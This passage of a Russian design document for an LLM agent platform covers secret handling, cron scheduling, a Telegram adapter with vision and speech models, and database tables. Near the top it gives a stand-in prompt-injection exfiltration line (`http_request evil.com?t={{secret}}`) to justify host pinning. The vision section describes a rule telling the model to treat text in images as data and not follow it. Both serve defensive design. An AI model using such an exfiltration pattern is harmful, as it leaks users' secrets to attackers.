  параметров от агента (иначе prompt-инъекция получает канал экфильтрации:
  `http_request evil.com?t={{secret}}`);
- **привязка к хосту**: `resolve` отказывает любому хосту, кроме зафиксированного при
  создании — отравленная/опечатанная запись не отправит секрет налево; текст ошибки
  значения не содержит;
- только заголовки (query-секрет утёк бы в URL и логи); валидация значения на
  printable ASCII (управляющие символы = header injection);
- **скраб ответов**: literal-вхождения подставленного значения вырезаются из тела до
  того, как его увидят LLM и архив (echo-эндпоинты, страницы ошибок);
- нет секрета → ошибка-инструкция агенту («попроси пользователя выполнить /secrets»).

**Ввод (T2, секрет не существует в чате).** `/secrets` в Telegram перехватывается
поллером ДО конвейера диалога (как `/start`): не персистится, не роутится, не видится
LLM. Ответ — одноразовая ссылка `{OF_PUBLIC_BASE_URL}/secrets.html?token=...`
(`SecretLinkService`: 128-битный токен, TTL 10 минут, in-memory — рестарт стоит лишь
повторного `/secrets`). Форма и её API (`/api/secrets/*`) — вне операторского
Basic-гейта (у пользователей диалога нет операторского пароля): токен и есть
аутентификация. Значения принимаются и никогда не возвращаются — все ответы API
metadata-only. Отклонённые альтернативы: T1 (перехват `/secret set ...` + deleteMessage —
секрет успевает побывать на серверах Telegram и в нотификациях), операторская консоль
(оператор видел бы чужие секреты). OAuth-поток — запланированное расширение для
провайдеров, где он есть: другой способ пополнения того же стора.

## Крон-задачи (этап F)

Модель, надёжность и принятые решения — в [cron.md](cron.md). Реализация:

- **Модуль `cron/`** — обособленный, зеркалит `datasets/` и `memory/`: граница `api.py`
  (Protocol `CronStore` — CRUD, due-выборка `list_due`, CAS-аренда `claim`/`release_claim`/
  `complete_fire`, исход `record_fire_result`; Protocol `CronWaker`; Protocol `Scheduler`
  — порт движка планирования; DTO `CronJob` (+ `one_shot`, `last_status`, `last_error`,
  `retry_count`); ошибки `CronJobNotFoundError`/
  `CronScheduleError`; чистые функции расписания `compute_next_fire`/`count_missed` на
  croniter + zoneinfo — новая зависимость `croniter`; без py.typed → локальный
  `ignore_missing_imports` с комментарием в `core/pyproject.toml`). Локальная реализация
  `SqlAlchemyCronStore`: таблица `cron_jobs` (собственность модуля). Расписание считается
  croniter'ом по IANA-таймзоне задачи; хранение и сравнения — aware UTC.
  `CronStore.list_due`/`claim`/`release_claim`/`complete_fire` + `compute_next_fire`/
  `count_missed` — публичный контракт для альтернативных движков (Celery beat, APScheduler,
  OS cron): инсталлятор либо подменяет `Scheduler` в корне, либо не стартует наш и драйвит
  store + математику расписаний из своего раннера.
- **Планировщик** (`cron/scheduler.py`): `CronScheduler` — реализация порта `Scheduler`,
  asyncio-задача в lifespan, `owner` = uuid инстанса, knobs из Settings через
  `CronSchedulerConfig`. Тик (метод `tick(now)` тестируем без сна): due-выборка (enabled,
  `next_fire_at <= now`, аренда свободна или протухла по lease TTL, ORDER BY `next_fire_at`,
  LIMIT replay_limit) → CAS `claim` одним UPDATE (проигравший гонку пропускает) → wake
  (prompt + суффикс про пропущенные прогоны при coalesce) → `complete_fire` с пересчётом
  `next_fire_at` от момента выстрела; исключение из waker → `release_claim`, задача остаётся
  due. Разброс 0.5 с (`REPLAY_STAGGER_SECONDS`) ставится **только** перед задачей, которая
  сама пропустила хотя бы один прогон (`_has_missed_runs` — тот же `count_missed`, что и
  для суффикса про coalesce): несколько независимых задач, случайно совпавших на одном
  тике (например, минутные расписания), выстреливают подряд без паузы — тег стабильности
  2026-07-28.
- **Исход выстрела** (`cron/reporter.py` + хук в акторе): актор репортит терминальный
  статус задачи с `cron_job_id` через порт `TaskOutcomeListener` (`agent/runner.py`,
  generic; ошибки репортёра ловятся — диалог не страдает). Адаптер `CronOutcomeReporter`
  применяет политику без ретраев (`retry_at` всегда None): DONE → сброс серии,
  DONE/FAILED + one_shot → удаление задачи (`delete_for_user`), иначе FAILED → фиксация
  `last_status`/`last_error` через `record_fire_result` (атомарный UPDATE: `last_status`/
  `last_error` ≤ 500 символов, сброс `retry_count`), CANCELLED → фиксация так же.
  Колонки приезжают Alembic-ревизией `2b8f4c1a9e07`; `bootstrap_schema` теперь
  явно коммитит транзакцию миграций (баг: неявный откат терял version-запись и ALTER'ы).
  Добавление колонок в ревизии условное (пропуск уже существующих): legacy-БД штампуется
  на baseline даже когда её `create_all` был новее и колонки уже есть (баг: stamp на head
  помечал такую БД актуальной, и ALTER'ы никогда не применялись).
- **One-shot напоминания**: флаг `one_shot` в `cron_jobs` и `task_create` (и в HTTP
  `POST /jobs`); расписание — датированное cron-выражение (`minute hour day month *`),
  агент строит сам под ближайшее будущее вхождение; после первого терминального исхода
  (DONE или FAILED) задача удаляется — один выстрел, одна попытка.
- **Идемпотентность создания** (`create_job` в `cron/tools.py`): совпадение
  `(title, schedule, prompt, one_shot)` по `list_for_user` → ответ `already exists`
  вместо дубля. `task_list` и HTTP API показывают `last run: <status> (<error>)` и
  `retry #N`.
- **Выстрел в акторе**: `ConversationManager.wake` → get-or-create runner →
  `ConversationRunner.wake(title, prompt, cron_job_id)` — общий со `spawn_task` приватный
  хелпер, но `Task.input += {"cron_job_id", "fired_at"}`; переполнение лимита процессов →
  шаблонное уведомление брокера (`CRON_LIMIT_NOTICE_TEMPLATE`, assistant-сообщение в
  нарративе + доставка через outbox), а не текст-отказ. Доставка результата —
  существующий outbox-путь завершения фоновой задачи.
- **Своё API как внешнее**: SSRF-гвард += `allowed_prefixes` (пропуск до resolve; в
  composition root — только `OF_SELF_BASE_URL`); `ExternalCallAuth.header_value` +=
  темплейт `{user_id}` (подстановка из `ToolContext.user_id`; вызов без user_id → без
  заголовка); тул `external_call` передаёт `context.user_id`. В whitelist composition
  root программно добавляется запись `(self_base_url, "X-User-Id", "{user_id}")`.
- **Нативные тулы** (`tasks/tools.py` + `cron/tools.py`): `task_create` (создание
  и фоновых задач, и крон-задач), `task_list`, `task_delete`, `cron_pause`,
  `cron_resume` над `CronStore`/`TaskStore` — семантика HTTP-эндпоинтов
  (owner-скоуп, resume пересчитывает `next_fire_at` от now), но без loopback-вызовов:
  работают и в standalone Telegram-раннере. Регистрируются в composition root на всех
  поверхностях; agent-managed крон больше не зависит от поднятого HTTP API.
- **HTTP API** (`web/api/cron.py`, префикс `/api/cron`, скоуп по `X-User-Id`, параметры —
  query string): `POST /jobs` (201; валидация schedule через croniter и timezone через
  zoneinfo → 422 с detail; `next_fire_at` от now), `GET /jobs`, `DELETE /jobs/{id}`
  (204; чужая/нет → 404), `POST /jobs/{id}/pause|resume`. Остаётся для внешних клиентов.
- **Системный реестр**: HTTP-сид-тулы крона удалены синком `sync_system_registry`
  (их нет в реестре — системные записи вне реестра стираются); нативный сценарий
  отложенной работы — системный скил `deferred_work` в `CORE_SYSTEM_SKILLS`.
- **Промпт**: пер-туловые правила вынесены в системные сценарии — см. «Системный промпт».

## Telegram-адаптер (этап G)

Решения о поверхностях — в [dialogs.md](dialogs.md). Реализация
(`web/src/octoforge_web/telegram/`; core про транспорт не знает):

- **Транспорт**: Bot API напрямую через httpx (без aiogram): `TelegramBotClient` (порт
  `TelegramClient`) — `getUpdates` (long poll), `sendMessage`, `editMessageText`,
  `sendChatAction`; `ok=false` → `TelegramApiError`, «message is not modified» глушится
  в правках. Модели (`telegram/models.py`) — pydantic, `extra="ignore"`, алиас `from`;
  тип чата — `TelegramChatType(StrEnum)`.
- **Ретраи на уровне клиента** (стабильность, 2026-07-28): `_call` честно повторяет вызов
  до `MAX_CALL_ATTEMPTS` (3) раз — 429 ждёт ровно `parameters.retry_after` из тела ответа
  (`retry_after` выше `MAX_TOTAL_RETRY_WAIT_SECONDS`, 10 с, суммарно по всем попыткам — не
  ждать, сразу `TelegramApiError`, как раньше), транзиентные сетевые ошибки/5xx
  (`RETRYABLE_HTTP_STATUS_CODES`) — фиксированной паузой `TRANSIENT_RETRY_DELAY_SECONDS` (1
  с). Это не рейт-лимитер, просто честный bounded retry. `sendChatAction` (typing-индикатор,
  fire-and-forget) вызывается с `retry=False` — дешёвый отказ вместо очереди на ретрай.
- **Поверхность**: канал `"telegram"` объявлен адаптером; `user_id = "tg:<telegram user id>"`;
  только личные чаты (группам и не-текстовым сообщениям — короткое уведомление).
  Идентичности web/telegram не связываются (alice ≠ tg:123) — линкинг придёт с
  аутентификацией; память per-user работает внутри каждой идентичности.
- **Поллер** (`telegram/poller.py`): цикл long-poll в lifespan-задаче; offset в памяти;
  при старте backlog сливается (`offset=-1`), старые сообщения не реплеятся; httpx/API-ошибки —
  лог + backoff, цикл живёт; «ядовитый» update редуцируется до голого `update_id`, чтобы
  offset не встал на нём. Команды: `/start` (приветствие), `/cancel` (отмена прогона).
  Три слоя защиты (стабильность, 2026-07-28): `_dispatch_safely` ловит любой `Exception`
  (не только httpx/`TelegramApiError`) — один плохой update или сбой invites-стора не должен
  ронять весь поллинг; `run_forever` сверху ловит всё, что просочилось мимо обоих внутренних
  слоёв, и уходит в тот же backoff; в `main.py._start_telegram` на созданную задачу вешается
  `add_done_callback(_report_telegram_task_failure)` — supervisor-lite, громкий `logger.error`,
  если задача поверхности всё же завершилась исключением (отмена при штатном шатдауне — не
  ошибка).
- **Мост** (`telegram/bridge.py`): `TelegramBridge` на чат: постоянная подписка на события
  runner'а (подписка ДО submit — события не реплеятся), рендер — **черновик на обмен**
  (`_drafts: dict[exchange_id | None, _Draft]`; ключ `None` — уведомления брокера и
  результаты RUN-задач): ответы разных вопросов стримятся конкурентно, каждый в своё
  редактируемое сообщение; дельты текста с throttle-правками
  (`OF_TELEGRAM_EDIT_THROTTLE_SECONDS`), статус-строки тулов (⚙️/⚠️) в порядке прихода;
  **ответ — реплаем на свой вопрос**: поллер кладёт в `client_message_id` chat-level
  `message_id` вопроса (он же дедуп-ключ вместо прежнего `update_id`), раннер несёт его через
  `task.input.source_client_message_id` в `ProcessStarted` (идёт перед первым токеном
  прогона и первым событием outbox-доставки — реплай задаётся только при создании
  сообщения, edit его не меняет) и в `Finished`; мост ставит цель на черновик обмена и шлёт
  **первый** чанк с `reply_parameters` (`allow_sending_without_reply` — удалённый вопрос не
  роняет ответ), continuation-чанки — без реплая. None/нечисловой ключ (старые
  задачи, другой транспорт) — обычное сообщение. Обратное направление — карта
  `_reply_targets` (id отправленного сообщения → его обмен, bounded LRU на 512):
  реплай пользователя на сообщение бота резолвится в `reply_to_exchange_id` и минует
  LLM-роутер; потеря карты на рестарте — лишь цена лишнего роутер-вызова.
  `ProcessCompleted` не рисуется (завершения приходят доставкой финала). Переполнение
  лимита 4096 — seal текущего сообщения и продолжение в новом (запечатанные головы в
  `_Draft.sealed_chunks`, буфер копится сырым). Зависимость
  моста — `RunnerProvider` (callable → runner); в composition root это
  `ConversationManager.get_or_create_runner`. **Финальный флаш** (стабильность, 2026-07-28):
  `_render_terminal` больше не теряет черновик на исключении — `_flush_terminal_with_retry`
  повторяет неудавшийся флаш ровно один раз после короткой паузы
  (`TERMINAL_FLUSH_RETRY_DELAY_SECONDS`), а `_drafts.pop(exchange_id)` стоит в `finally`
  вокруг ретрая: черновик снимается ровно один раз независимо от исхода, иначе застрявший
  черновик съедал бы следующий ответ того же обмена. Если и повтор не удался — `logger.error`
  (не warning): финальный ответ потерян, и это должно быть заметно.
- **Разметка** (`telegram/markdown.py`): ответы модели идут с `parse_mode="HTML"`: сырой
  markdown буфера конвертируется в Telegram-HTML (`markdown_to_telegram_html` — bold/italic/
  strike, inline/fenced code, ссылки, заголовки как `<b>`, цитаты, списки `•`, экранирование),
  разбиение — `split_html_safe` (срез по границе строки/слова, никогда внутри тега; стек
  открытых тегов закрывается в голове и переоткрывается в хвосте). На ошибку Bot API
  «can't parse entities» клиент повторяет отправку без parse_mode (plain text-фолбэк).
  Финал прогона апгрейдится на месте в Rich Message (Bot API 10.1,
  `editMessageText(rich_message={"markdown": сырой буфер})` — таблицы, чеклисты,
  collapsible-details и блок-математика рендерятся нативно), но только когда детектор
  `telegram/rich.py:needs_rich_message` находит такую конструкцию, ответ живёт в одном
  сообщении (без запечатанных чанков) и влезает в лимит 32 768 символов
  (`MAX_RICH_MESSAGE_LENGTH`); черновик-стрим остаётся на HTML-пути, обычная проза — тоже.
  Падение rich-правки ловится `_render_safely`: на экране остаётся HTML-версия.
- **Прогрев**: при старте мосты поднимаются для всех диалогов канала telegram из БД
  (`DialogRepository.list_user_ids_by_channel`) — иначе крон-выстрелы и уведомления задач
  после рестарта ушли бы в пустоту (подписчиков нет); chat_id выводится из `tg:<id>`.
- **Конфиг**: `OF_TELEGRAM_BOT_TOKEN` (пусто = адаптер выключен),
  `OF_TELEGRAM_POLL_TIMEOUT_SECONDS` (30), `OF_TELEGRAM_EDIT_THROTTLE_SECONDS` (1.5),
  `OF_TELEGRAM_RICH_MESSAGES` (true — rich-апгрейд финала; false = всегда HTML),
  `OF_TELEGRAM_ADMIN_IDS` (CSV telegram user id админов), `OF_TELEGRAM_DATABASE_URL`
  (отдельная SQLite-база инвайтов, по умолчанию `./telegram.db`),
  `OF_TELEGRAM_INVITE_TTL_SECONDS` (срок жизни pending-кода, по умолчанию 3 суток;
  протухший код остаётся в базе, но не клеймится).
- **Инвайты и гейт членства** (`telegram/invites/`, реализация
  [telegram-invites-plan.md](telegram-invites-plan.md)): доступ по приглашениям,
  целиком в web-слое — своя SQLite-база, свой `Base`, без Alembic и без касания core.
  Гейт `TelegramMembership` в поллере: админы (`OF_TELEGRAM_ADMIN_IDS`) проходят
  всегда; `/start <код>` атомарно клеймит код (CAS в `InviteStore.claim`, pending-код
  протухает по `OF_TELEGRAM_INVITE_TTL_SECONDS` — `InviteExpiredError`, гейт отвечает
  отказом, запись остаётся в базе); обладатель CLAIMED-инвайта проходит; остальным —
  вежливый отказ без создания бриджа. Гейт (и админский тул) активируется только при непустом списке админов —
  иначе поверхность открыта, как раньше.
- **Картинки понимает отдельная модель** (`core/.../vision/`, 29.07): главная
  LLM текстовая — провайдер прямо отвечает «this model does not support image
  input», — поэтому зрение вынесено за порт `VisionClient` и живёт своей
  моделью. Два тира по измеренной цене: на входе каждое изображение
  описывает дешёвая модель (`OF_VISION_MODEL`, по умолчанию `minimax-m3`,
  ~4-8 с, ~600 токенов) — результат становится текстом сообщения
  («[изображение] …» с сохранением атрибуции пересылки и подписи), а тяжёлая
  (`qwen3.5`, ~15-30 с, вчетверо больше токенов) зовётся только по явному
  вопросу пользователя о картинке. Модуль **отключаемый**: пустой
  `OF_VISION_MODEL` = поведение как раньше (плейсхолдер/«понимаю только
  текст»), и **подменяемый**: конкретный клиент собирается только в
  композиционном корне, поллер знает лишь порт. Байты не хранятся — в
  `messages.attachments` едет ссылка `tg:<file_id>` (Telegram хранит файлы
  бота), чтобы позже можно было переспросить ту же картинку. Текст с
  изображения — недоверенный ввод: промпт распознавания прямо требует
  сообщать его как данные и не выполнять содержащиеся в нём инструкции.
  **Картинка без подписи — материал**, как пересланное сообщение: пользователь
  чем-то поделился, но ничего не попросил, поэтому она копится в коллекции и
  агент спрашивает, что с ней делать, вместо непрошеного пересказа. Подпись
  меняет дело — тогда говорит пользователь, а изображение это контекст.
  Тяжёлый тир доступен тулом `image_look` (`OF_VISION_DEEP_MODEL`): агент
  переспрашивает картинки **последнего сообщения** диалога конкретным вопросом;
  ref'ы модели не показываются, тул скрыт (`visible_to`), если зрения нет.
- **Тяжёлый тир подключён** (`image_look`, 29.07): тул `ImageLookTool`
  (`core/.../vision/tools.py`) зарегистрирован в реестре безусловно —
  прячет себя сам через `visible_to(context)`, когда
  `ToolContext.image_inspector is None`. Коллабораторы —
  `RunnerConfig.vision`/`RunnerConfig.image_resolver` — теперь доходят до
  рантайма через `RunnerOptions` (`build_runner_config` их читает оттуда;
  добавлять их отдельными параметрами упёрлось в лимит `PLR0913`). На
  веб-стороне: `OF_VISION_DEEP_MODEL` (по умолчанию `qwen3.5:397b`,
  пустое значение = тул выключен) и `Settings.to_deep_vision_config()` —
  зеркало `to_vision_config()`, тот же фоллбэк base URL/ключа на основную
  LLM, отличается только модель; клиент собирается через тот же
  `httpx.AsyncClient`, что и дешёвый тир (`vision_http`). Резолвер —
  `TelegramImageResolver` (`telegram/images.py`): разбирает
  `tg:<file_id>`, `getFile` → `downloadFile`, медиатип угадывается по
  расширению пути (`.png`/`.webp`, иначе `image/jpeg`); чужой префикс
  или ошибка Bot API оборачиваются в `VisionUnavailableError` — порт
  зрения никогда не видит `TelegramApiError`. Строится отдельным,
  выделенным `TelegramBotClient` в `runtime()` **до** `_start_telegram()`
  (а не переиспользуя клиент поллера): рантайм общий для web и
  standalone-бота (`python -m octoforge_web.telegram`), а конфиг раннера
  собирается раньше, чем стартует поллер — резолвер должен существовать
  независимо от того, когда (и стартует ли вообще в эту секунду) сам
  поллер. `TelegramBotClient` — тонкая обёртка над общим `outbound_http`,
  так что второй экземпляр ничего не стоит (то же самое уже делает
  `admin_manage`, у которого свой отдельный `TelegramBotClient`).
- **Разбор боевого диалога 29.07 — три дефекта зрения и один диалоговый**
  (пользователь прислал альбом из трёх страниц меню и задал вопрос; агент ответил
  по одной странице, а на уточнение сказал «курицы в меню нет»):
  - **Альбом больше не теряет страницы.** Схлопывание по `media_group_id` было
    написано до зрения (тогда N фото давали N заглушек «понимаю только текст») и
    выбрасывало все элементы, кроме первого. Теперь поллер **копит** элементы
    альбома (`_Album`, окно тишины `ALBUM_QUIET_SECONDS = 1.5 с`,
    `TelegramPollerOptions.album_quiet_seconds`), описывает все картинки
    параллельно и отдаёт **одно** сообщение: `[изображение 1/3] …` + подпись (с
    какого бы элемента она ни пришла) + все вложения. Одно сообщение, а не N, —
    принципиально: подпись в Telegram висит только на одном элементе, поэтому
    остальные страницы стали бы материалом, ушли бы в свою коллекцию и получили
    бы отдельную реакцию, а прогон по вопросу видел бы одну страницу. Порядок
    и сбор бурста обеспечивает очередь ingestion (см. следующий пункт), а не
    отдельная машинерия. Страница, которую не удалось описать, сохраняет своё
    место (`(не удалось распознать это изображение)`) и своё вложение —
    `image_look` может вернуться к файлу.
  - **Описание не режется молча.** Промпт распознавания требовал «уложись
    примерно в 1200 символов», и снимок страницы меню обрывался посреди списка
    (в проде — ровно 1175 символов, на букве «Ж»), выглядя при этом законченным.
    Бюджет поднят (~2500 символов, `VISION_MAX_TOKENS` 900 → 1600), а главное —
    обрыв обязан быть **явным**: маркер `[текст на изображении обрезан]`
    последней строкой. Тяжёлый тир получил свой бюджет `VISION_DEEP_MAX_TOKENS`
    (2400) — его зовут как раз про тот текст, что не поместился, и показывают
    ему сразу несколько страниц.
  - **`image_look` смотрит на всё сообщение целиком.** `_latest_images()` отдаёт
    все картинки последнего сообщения, где они есть (альбом = одно сообщение),
    с потолком `MAX_LOOK_IMAGES = 6`, и уходят они одним вызовом. Описание тула
    получило политику вызова: обязательно звать, если описание помечено
    обрезанным, **и перед тем, как сказать пользователю «этого на картинке
    нет»** — за сутки в проде тул не был вызван ни разу, притом что модель сама
    написала «изображение обрывается на букве Ж» и всё равно ответила по
    обрезанному тексту.
  - **Прогон, который спросил, больше ничего не пишет** — см. `docs/exchanges.md`
    («Уточняющий вопрос агента»): `_muted_after_ask` глушит дельты и обнуляет
    финал. Побочно чинится маршрутизация: мусорный финал закрывал обмен как
    `ANSWERED`, и ответ пользователя открывал новый обмен вместо продолжения.
- **Очередь ingestion: цикл опроса больше ничего не ждёт** (29.07, подготовка к
  голосовым сообщениям). Раньше `dispatch` качал файл и звал зрение **внутри**
  цикла опроса: пока описывается чья-то картинка (4–8 с), апдейты остальных не
  читались — тот самый stop-the-world, только на уровне поверхности. С голосом
  (десятки секунд на двухминутную запись) это стало бы неприемлемо, поэтому
  инвариант теперь такой: **цикл опроса не ждёт ничего, кроме `getUpdates`**.
  - `dispatch` разбирает апдейт и кладёт сообщение в очередь **этого
    пользователя** (`_Inbox`: deque + `asyncio.Event` + задача-воркер). Всё
    остальное — инвайт-гейт, зеркало профиля, скачивание, зрение, отдача в
    бридж — делает воркер этого пользователя (`_handle`). Порядок внутри
    диалога — FIFO по построению, между диалогами работа идёт параллельно.
  - **`/cancel` — единственное исключение**, он обрабатывается прямо в цикле:
    стоп не должен стоять в очереди за двухминутной расшифровкой. Действует
    только для пользователя, у кого бридж уже есть (`TelegramBridgeRegistry.existing`) —
    так незнакомец ничего не добивается, и в цикл не возвращается чтение из
    базы инвайтов (бриджи известных диалогов прогреваются на старте).
    Отмена **сбрасывает** очередь и отменяет саму задачу-воркер: то, что она
    качала или описывала, просто не доходит до диалога, без флагов и проверок.
    Иначе расшифровка всплыла бы через секунды после «стоп» и подняла новый
    прогон.
  - **Альбом собирается очередью**: воркер, получив элемент с `media_group_id`,
    добирает следующие с тем же id, ожидая до `ALBUM_QUIET_SECONDS`; чужое
    сообщение возвращается в голову очереди (`appendleft`) и обрабатывается
    сразу после альбома. Это заменило целиком: словарь альбомов, таймерные
    задачи, лок на пользователя и выталкивание альбома перед следующим
    сообщением — порядок стал свойством очереди, а не отдельной конструкцией.
  - **Потолок параллелизма** `MAX_CONCURRENT_INGESTIONS = 4` (семафор вокруг
    скачивания+распознавания): очередь сериализует внутри диалога, семафор
    ограничивает по всем сразу.
  - **Индикатор активности**: «печатает» теперь ставит воркер и повторяет каждые
    4 с (действие в Telegram истекает через 5), пока идёт медленная часть —
    раньше его отправлял `handle_text`, то есть уже **после** распознавания, и
    пользователь смотрел в тишину. Для MATERIAL индикатор не показывается по той
    же причине, по которой его не показывает бридж: он обещал бы ответ, которого
    сейчас не будет.
  - **Живучесть**: catch-all переехал из `_dispatch_safely` в `_handle_safely` —
    воркер владеет порядком одного диалога и обязан пережить сообщение, которое
    не смог обработать; `CancelledError` пробрасывается (это осознанный стоп или
    шатдаун). Умерший воркер логируется и пересоздаётся следующим сообщением;
    простаивающий 60 с — выходит сам и забывает очередь.
  - Тесты: у поллера теперь два входа — `dispatch` (постановка в очередь, ею
    проверяются порядок, обход для `/cancel`, независимость пользователей) и
    хелпер `deliver` в тестах (положить и дождаться воркера), которым пользуется
    всё остальное.
- **Голосовые сообщения понимает отдельная модель** (`core/.../speech/`, 29.07):
  главная LLM читает текст, поэтому запись превращается в текст **до** того, как
  попадёт в диалог — портом `TranscriptionClient`, как картинки портом
  `VisionClient`. Тира здесь один: у записи нет «посмотреть внимательнее»,
  транскрипт **и есть** сообщение.
  - **Своё голосовое — это пользователь говорит** (`MessageKind.OWN`): открывает
    обмен и запускает прогон, как набранный текст. Это осознанная асимметрия с
    картинками: поделиться фотографией — не значит о чём-то попросить (потому фото
    без подписи — материал), а записать голосовое — значит именно сказать.
    **Пересланное** голосовое — чужие слова, то есть `MATERIAL` с атрибуцией.
    Ниже по течению не менялось ничего: роутер, обмены, nudge и отмена работают с
    текстом, а транскрипт это текст — «остановись», сказанное голосом, отработает
    как COMMAND само собой.
  - В нарратив ложится `[голосовое] <транскрипт>` (для пересланного — с
    атрибуцией впереди, подпись, если была, дописывается). Тег не украшение: агент
    должен знать, что слова услышаны, а не набраны — оговорки и ослышки ожидаемы, а
    при двусмысленности лучше переспросить. Ссылка на файл едет в
    `Attachment(kind=AUDIO, ref="tg:<file_id>")` — сейчас не используется, но
    оставляет дверь для «переслушать» тяжёлым тиром.
  - **Проверка на входе идёт по длительности из самого апдейта**, до скачивания:
    короче `VOICE_MIN_SECONDS` (случайное касание) и длиннее `OF_VOICE_MAX_SECONDS`
    отклоняются. Порог по длительности защищает и суточную квоту провайдера.
    Причина именно такой защиты измерена: на пустой записи 0.2 с модель вернула не
    тишину, а уверенную выдумку («Продолжение следует...») при `no_speech_prob: 0`
    и хорошем `avg_logprob` — встроенные метрики уверенности галлюцинацию **не
    ловят**, поэтому «пустой транскрипт» как защита не годится. `duration=None`
    (документ, длительность неизвестна) — это не «ноль секунд», проверка
    пропускается.
  - **Отдельный провайдер, без фоллбэка на основную LLM.** Проверено пробами:
    у шлюза этого деплоя (`ollama.com/v1`) нет `/audio/transcriptions` (404), и
    ни одна из 19 его моделей не принимает звук на входе (`invalid image:
    expected image mime type, got "audio/wave"`). Поэтому `OF_STT_BASE_URL`
    обязателен: пустой URL **или** пустая модель = фича выключена (запись получает
    сегодняшнее «понимаю только текст»), а молчаливый фоллбэк на URL основной LLM
    превратил бы «голос выключен» в «каждое голосовое падает».
  - **Имя файла — не мелочь**: эти API выбирают декодер по расширению, а Telegram
    отдаёт голосовые как `.oga`, которое провайдер отвергает («file must be one of
    the following types»). `speech.api.upload_name` переименовывает в `.ogg` (тот
    же контейнер Ogg), сохраняет уже допустимые расширения и подставляет дефолт для
    незнакомых. Ошибка здесь ломала бы **каждое** голосовое, поэтому она закрыта
    тестом, а не обнаружением в проде.
  - Groq free tier (`whisper-large-v3-turbo`) для личного деплоя достаточен:
    20 запросов в минуту, 2000 в сутки, 7200 секунд аудио в час, 28800 в сутки
    (лимиты организационные, общие на всех пользователей бота).
- **Пересланные сообщения — материал, а не вопрос**: сообщение с `forward_origin`
  приходит в ядро с `MessageKind.MATERIAL` и атрибуцией прямо в тексте
  (`[переслано от Иван Петров] …`); такое сообщение ложится в нарратив как контекст
  и **не открывает обмен и не запускает прогон** (реакция появляется отдельно —
  см. фазы 2-3 плана). Нетекстовые сообщения теперь обрабатываются **после**
  инвайт-гейта (раньше незнакомец получал «понимаю только текст» до проверки
  доступа), пересланное вложение превращается в плейсхолдер, а альбом собирается
  по `media_group_id` в одну запись вместо N.
- **Профили пользователей** (`members` в той же телеграм-базе): пройдя гейт,
  каждое сообщение обновляет живое зеркало профиля отправителя — имя, фамилия,
  @username, `first_seen_at`/`last_seen_at` (`SqlAlchemyMemberDirectory`; запись
  не должна ломать диспетчеризацию — ошибки только логируются, незнакомцы с
  плохим кодом не записываются). Профили видны оператору (вкладка «Пользователи»
  консоли, `GET /api/admin/telegram/users` — join с инвайтом: код, note, статус)
  и админу через `admin_manage list_users` (строка пользователя показывает
  `Имя Фамилия (@username)` и `claimed via invite <код>, note: …`).
- **Админский тул** (`telegram/admin.py`): тул `admin_manage` (действия
  `list_users`/`generate_invite`/`revoke_invite`/`restore_invite` +
  `search_instructions`/`publish_instruction` — поиск инструкций по всем
  пользователям (`InstructionService.search_all`, выдача с id/owner) и публикация
  записи по id (`publish`, owner → NULL: становится видна всем)) регистрируется
  только при включённом Telegram и непустых админах. Отзыв обратим: инвайт
  переводится в REVOKED (поллер блокирует новые сообщения), крон-задачи пользователя
  выключаются (не удаляются) с запоминанием id в записи инвайта — `restore_invite`
  включает обратно ровно их, не трогая паузы, поставленные самим пользователем;
  уже запущенные процессы добиваются естественно. Тул скрыт от не-админов на уровне
  списка тулов: общий duck-typed хук `visible_to(context)` в
  `ToolRegistry.specs(context)` (core про инвайтов/админов не знает — хук общий),
  плюс проверка допуска первой строкой `execute()`.
- **Standalone-режим** (`telegram/__main__.py`): `python -m octoforge_web.telegram` поднимает
  только адаптер и крон-планировщик на общем composition root'е (`runtime()` в `main.py`,
  вынесен из FastAPI-lifespan) — FastAPI-приложение не создаётся, порт не слушается, только
  исходящие соединения (Bot API, LLM, эмбеддинги). Без токена процесс отказывается стартовать;
  остановка по SIGINT/SIGTERM.
- **Токен в логах**: HTTP-статусы Bot API конвертируются в `TelegramApiError` без URL
  (`raise ... from None`) — токен из пути запроса не попадает в логи.
- **Не входит**: группы/треды, webhook-режим, медиа и файлы, inline-кнопки,
  связывание идентичностей, outbox при оффлайн-инстансе ([scaling.md](scaling.md)),
  Rich Messages (Bot API 10.1+), таблицы в разметке (промпт просит код-блоки).

## Модель данных

ORM-модели — в `octoforge_core/db/models.py`; доменные объекты — в `octoforge_core/domain.py`
и `octoforge_core/tasks/models.py`; маппинг ORM↔домен — в репозиториях
(`octoforge_core/db/repositories.py`). Таблицы `users` пока **нет**: `user_id` — доверенная
непрозрачная строка от клиента, аутентификация отложена (см. [plan.md](plan.md)). Схема:

- **dialogs**: `id` (uuid str PK), `user_id` (str, index), `channel` (str), `created_at`,
  `updated_at`; unique (`user_id`, `channel`)
- **messages**: `id`, `dialog_id` FK (index), `seq` (int, монотонно растёт в рамках диалога;
  unique (`dialog_id`, `seq`); присваивается подзапросом `max(seq)+1` прямо в INSERT.
  Конкурирующие писатели (актор и pump'ы процессов, каждый в своей сессии) всё же могут
  прочитать один и тот же max до коммита друг друга — проигравший ловит `IntegrityError`
  на `(dialog_id, seq)` и повторяет вставку с пересчитанным seq (`append`/`append_pair`,
  до `MESSAGE_SEQ_RETRY_ATTEMPTS` попыток), а не теряет сообщение), `role` (значение
  MessageRole), `content`, `tool_calls` (JSON, nullable), `tool_call_id` (nullable),
  `created_at`, `task_id` (nullable, index — задача, сформировавшая сообщение; миграция
  `d1e5f9a3b247`). Пишется только нарратив (см. «Актор диалога»), не полные ветки прогонов
- **tasks**: `id`, `dialog_id` FK (index), `user_id` (index), `channel`, `kind`
  (RUN|ANSWER), `title`, `input` (JSON: `{"title", "prompt"}`, у крон-выстрелов +=
  `{"cron_job_id", "fired_at"}`), `status` (PENDING|RUNNING|DONE|
  FAILED|CANCELLED), `result`, `error`, `created_at`, `started_at`, `finished_at`,
  `delivered_at` (nullable — отметка доставки результата в транспорт, миграция
  `d1e5f9a3b247`). Строки хранятся вечно: терминальные статусы не удаляются.
- **instructions** (таблица модуля `instructions/`, см. выше): `id` (uuid str PK), `type`
  (knowledge|skill|endpoint, index), `title` (index), `content` (Text), `embedding` (JSON
  list[float]), `tags` (JSON list[str]), `version`, `usage_count`, `success_count`,
  `created_at`, `updated_at`; unique (`type`, `title`)
- **datasets** (таблица модуля `datasets/`, см. выше): `id` (uuid str PK), `owner_user_id`
  (str, index), `name`, `description`, `schema` (JSON: `{"fields": [...]}`), `usage_notes`,
  `retention`, `embedding` (JSON list[float]), `version`, `created_at`, `updated_at`;
  unique (`owner_user_id`, `name`)
- **dataset_records**: `id`, `dataset_id` FK → datasets.id (index), `owner_user_id`
